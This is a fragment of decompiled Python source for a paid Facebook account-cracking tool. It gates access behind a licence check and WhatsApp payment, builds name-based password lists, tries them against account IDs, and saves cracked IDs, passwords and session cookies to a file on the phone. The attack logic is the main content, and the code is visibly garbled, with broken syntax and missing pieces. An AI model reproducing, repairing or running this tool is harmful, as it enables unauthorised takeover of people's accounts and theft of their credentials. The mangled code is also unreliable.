...
def loginkey():
    ...
    print('\x1b[1;92m--------------------------------------------------')
    system = requests.get('https://github.com/saedhasan7840/AK-PAID/blob/main/Approval.txt').text
    if Xyteee in system:
        print()
        msg = str(os.geteuid())
        time.sleep(1)
    ...
    print('\x1b[1;92m-----------------------------------------------------\x1b[1;97m')
    print('\x1b[1;92m [\x1b[1;92m1\x1b[1;92m]\x1b[1;92m 10$ \x1b[1;92mApproval For 1 month')
    print(' \x1b[1;92m[\x1b[1;92m2\x1b[1;92m]\x1b[1;92m 7$ \x1b[1;92mApproval For 15 days')
    ...
    print('-----------------------------------------------------')
    url_wa = 'https://api.whatsapp.com/send?phone=+537468224&text='
...
def gmail():
    ...
    clear()
    print('\x1b[1;37m example: ramzan, ali, hasan, saydia, faizan\x1b[1;97m')
    linex()
    first = input(' Put first name: ')
    linex()
    print('\x1b[1;37m example: khan, hasan, hosen, ahmad, ali \x1b[1;97m')
    linex()
...
def api1(ids, names, passlist):
    try:
    global loop
    sys.stdout.write(f'\r\r\x1b[1;37m [AK-SAED-M1] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
...
random.choice(ascii_uppercase + ascii_lowercase + digits + '_')None)(range(24)())
        ...
        q = json.loads(po)
        if 'session_key' in q:
            print('\r\r\x1b[1;32m [AK-SAED-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/ZXB-COKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
            oks.append(ids)
            ''
        if 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
                print('\r\r\x1b[38;5;205m [AK-SAED-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
...
def api2(ids, names, passlist):
    try:
    global loop
    sys.stdout.write(f'\r\r\x1b[1;37m [AK-SAED-M2] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
...
random.choice(digits)None)(range(2)())
    ...
    try:
            if 'y' in pcp:
                print('\r\r \x1b[1;34m[AK-SAED-2F] ' + ids + ' | ' + pas)
                twf.append(ids)
                'Connection'
...
def ZISHAN4(ids, passlist):
    try:
    global loop
    sys.stdout.write(f'\r\r\x1b[1;37m [AK-SAED-XD] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m')
    sys.stdout.flush()
    for pas in passlist:
...
random.choice(digits)None)(range(2)())
        ...
        if 'session_key' in po:
            ...
            if str(uid) in oks:
                'X-FB-Server-Cluster'
            print('\r\r\x1b[1;32m [AK-SAED-OK] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
            coki = (i['name'] + '=' + i['value']None)(po['session_cookies']())
        ...
        if 'www.facebook.com' in po['error']['message']:
            ...
            if uid in oks:
                pass
            print('\r\r\x1b[1;33m [AK-SAED-CP] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
